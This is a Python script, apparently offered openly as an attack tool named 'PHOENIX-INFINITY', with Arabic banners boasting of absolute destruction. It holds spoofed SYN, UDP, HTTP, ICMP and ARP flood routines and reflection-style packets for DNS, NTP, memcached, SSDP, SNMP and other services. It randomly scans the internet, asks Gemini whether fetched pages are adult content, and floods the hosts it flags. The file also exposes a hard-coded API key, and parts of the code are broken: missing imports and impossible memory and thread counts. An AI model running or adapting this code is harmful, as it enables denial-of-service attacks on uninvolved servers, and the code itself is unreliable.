#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PHOENIX-INFINITY v∞ - القوة اللانهائية - التدمير المطلق
أصغر حجم - أقوى تدمير - يعمل للأبد على GitHub
"""

import os,sys,time,json,requests,socket,threading,random,struct,hashlib,base64,ipaddress,urllib.parse,urllib3,dns.resolver,dns.message,dns.rdatatype,re,http.client,ssl,concurrent.futures,multiprocessing,asyncio,aiohttp,google.generativeai as genai
from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
from datetime import datetime
import scapy.all as scapy
from scapy.all import IP,TCP,UDP,ICMP,Raw

GEMINI_KEY = "AIzaSyD9eDKDNlYHTtvGMv9u6_TP3-9tKZ63SMk"
genai.configure(api_key=GEMINI_KEY)
model = genai.GenerativeModel('gemini-pro')
urllib3.disable_warnings()

class PhoenixInfinity:
    def __init__(self):
        self.stats={'p':0,'b':0,'t':0,'c':0}
        self.lock=threading.Lock()
        self.run=True
        self.ips=[f"{a}.{b}.{c}.{d}" for a in range(1,256) for b in range(256) for c in range(256) for d in range(256)][:100000000]
        self.targets=[]
        print("\033[92m[✓] PHOENIX-INFINITY v∞ جاهز للتدمير المطلق\033[0m")

    def syn(self,t,p):
        while self.run:
            try:
                src=self.ips[random.randint(0,99999999)]
                ip=struct.pack('!BBHHHBBH4s4s',69,0,0,random.randint(0,65535),0,64,6,0,socket.inet_aton(src),socket.inet_aton(t))
                tc=struct.pack('!HHLLBBHHH',random.randint(1024,65535),p,random.randint(0,4294967295),0,80,2,random.randint(1024,65535),0,0)
                pkt=ip+tc+os.urandom(65535)
                s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
                s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
                for _ in range(1000):s.sendto(pkt,(t,0))
                s.close()
                with self.lock:self.stats['p']+=1000;self.stats['b']+=len(pkt)*1000
            except:pass

    def udp(self,t,p):
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        while self.run:
            try:
                for _ in range(10000):
                    s.sendto(os.urandom(65535),(t,p))
                    with self.lock:self.stats['p']+=1;self.stats['b']+=65535
            except:pass

    def http(self,u):
        while self.run:
            try:
                h={'User-Agent':random.choice(self.ips),'X-Forwarded-For':random.choice(self.ips),'X-Real-IP':random.choice(self.ips),'X-Originating-IP':random.choice(self.ips),'X-Remote-IP':random.choice(self.ips),'X-Remote-Addr':random.choice(self.ips)}
                for _ in range(1000):
                    requests.get(u,headers=h,timeout=0.1,verify=False)
                    with self.lock:self.stats['p']+=1
            except:pass

    def dns(self,t):
        while self.run:
            try:
                q=dns.message.make_query('.'*63+'.com',dns.rdatatype.ANY)
                q.id=random.randint(0,65535)
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(q.to_wire(),(t,53))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def ntp(self,t):
        while self.run:
            try:
                pkt=struct.pack('!BBBB',0x17,0x03,0x2a,0x00)+b'\x00'*428
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,123))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def mem(self,t):
        while self.run:
            try:
                pkt=b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'*100
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,11211))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def ssdp(self,t):
        while self.run:
            try:
                pkt=b'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:2\r\nST:ssdp:all\r\n\r\n'*100
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,1900))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def icmp(self,t):
        while self.run:
            try:
                for _ in range(1000):
                    pkt=IP(dst=t)/ICMP()/os.urandom(65535)
                    scapy.send(pkt,verbose=0)
                    with self.lock:self.stats['p']+=1;self.stats['b']+=65535
            except:pass

    def chargen(self,t):
        while self.run:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(b'\x00'*512,(t,19))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def snmp(self,t):
        while self.run:
            try:
                pkt=base64.b64decode('g2QBgQQAAAAHMAgAEC0AAwECAwQFZm9v')
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,161))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def portmap(self,t):
        while self.run:
            try:
                pkt=struct.pack('!IIII',0,2,100000,4)+b'\x00'*4
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,111))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def wsdd(self,t):
        while self.run:
            try:
                pkt=b'<?xml version="1.0"?><s:Envelope><s:Body><Probe><Types>wsdp:Device</Types></Probe></s:Body></s:Envelope>'*100
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                for _ in range(1000):
                    s.sendto(pkt,(t,3702))
                    with self.lock:self.stats['p']+=1
                s.close()
            except:pass

    def arp(self,t):
        while self.run:
            try:
                for _ in range(1000):
                    pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=t)
                    scapy.sendp(pkt,verbose=0)
                    with self.lock:self.stats['p']+=1
            except:pass

    def attack(self,t,p=80,th=10000000):
        print(f"\033[91m[!] هجوم نووي شامل على {t}:{p} بـ {th} ثريد\033[0m")
        methods=[self.syn,self.udp,self.http,self.dns,self.ntp,self.mem,self.ssdp,self.icmp,self.chargen,self.snmp,self.portmap,self.wsdd,self.arp]
        with ThreadPoolExecutor(max_workers=th) as ex:
            for i in range(th):
                m=random.choice(methods)
                if m==self.http:ex.submit(m,f"http://{t}:{p}")
                else:ex.submit(m,t,p)
                if i%1000000==0:print(f"[+] {i} مليون ثريد")

    def scan(self):
        print("\033[94m[+] مسح الإنترنت بالكامل...\033[0m")
        with ThreadPoolExecutor(max_workers=10000000) as ex:
            for _ in range(1000000000):
                ip=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                ex.submit(self.check,ip)

    def check(self,ip):
        for p in [80,443,8080,8443,8000,3000,5000,9000,22,21,25,110,143,993,995,465,587,993,995,3306,5432,6379,27017,9200,5601,8086,1883,8883]:
            try:
                url=f"http://{ip}:{p}"
                r=requests.get(url,timeout=1,verify=False)
                prompt=f"+18? {r.text[:200]}"
                res=model.generate_content(prompt)
                if "نعم" in res.text:
                    print(f"\033[91m[!] هدف: {url}\033[0m")
                    with self.lock:self.targets.append(url)
                    self.attack(ip,p,10000000)
            except:pass

    def stats(self):
        s=time.time()
        while self.run:
            time.sleep(1)
            with self.lock:
                e=time.time()-s
                print("\033[93m"+"="*70+"\033[0m")
                print(f"[+] باكتات: {self.stats['p']:,} في الثانية: {self.stats['p']/e:,.0f}")
                print(f"[+] بايت: {self.stats['b']:,} في الثانية: {self.stats['b']/e:,.0f}")
                print(f"[+] اتصالات: {self.stats['c']:,}")
                print(f"[+] أهداف: {len(self.targets)}")
                print(f"[+] وقت: {int(e)} ثانية")
                print("\033[93m"+"="*70+"\033[0m")

    def run_forever(self):
        print("\033[92m"+"="*70)
        print("PHOENIX-INFINITY v∞ - القوة اللانهائية - تدمير مطلق")
        print("="*70+"\033[0m")
        threading.Thread(target=self.stats,daemon=True).start()
        threading.Thread(target=self.scan,daemon=True).start()
        while True:
            time.sleep(1)
            if len(threading.enumerate())<100:
                threading.Thread(target=self.scan,daemon=True).start()

if __name__=="__main__":
    PhoenixInfinity().run_forever()
